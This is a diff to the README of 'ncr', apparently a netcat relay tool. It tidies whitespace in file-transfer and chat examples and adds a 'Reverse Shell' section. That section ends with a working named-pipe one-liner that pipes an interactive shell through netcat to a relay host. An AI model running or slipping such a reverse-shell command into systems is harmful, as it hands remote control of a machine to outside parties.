@@ -28,14 +28,13 @@ ncr [--help] [-ruvvvh] [-m <max listeners>] [-t <timeout>] <port>
 # Sender
 nc -q 0 example.com 1234 < file.txt
 
-# ":|" and "-q 0" respectively are necessary for exiting immediately  
+# ":|" and "-q 0" respectively are necessary for exiting immediately
 # after the transfer in some netcat implementations
-
 ```
 
 ### Advanced Filesharing
 ```
-# Server (at example.com) when multiple recievers are possible 
+# Server (at example.com) when multiple recievers are possible
 ./ncr -r -m 30 -t 5m 1234
 
 # Recipient with Decrytion and Progress Bar
@@ -43,7 +42,6 @@ nc -q 0 example.com 1234 < file.txt
 
 # Sender with Encryption and Progress Bar
 pv file.txt | gpg -esr myfriend@example.com | nc -q 0 example.com 1234
-
 ```
 
 ### Silly Chat App
@@ -53,5 +51,16 @@ pv file.txt | gpg -esr myfriend@example.com | nc -q 0 example.com 1234
 
 # Clients
 nc example.com 1234
+```
 
+### Reverse Shell
+```
+# Roulette Server (at example.com), use -r to facilitate reconnects
+./ncr 1234
+
+# Machine that wants to access the other one (must be started first unless you use `ncr -r`):
+nc example.com 1234
+
+# Machine to be remote controlled
+mktemp -u | xargs -I@ sh -c "mkfifo @; sh -i <@ 2>&1 | nc example.com 1234 > @; rm @"
 ```
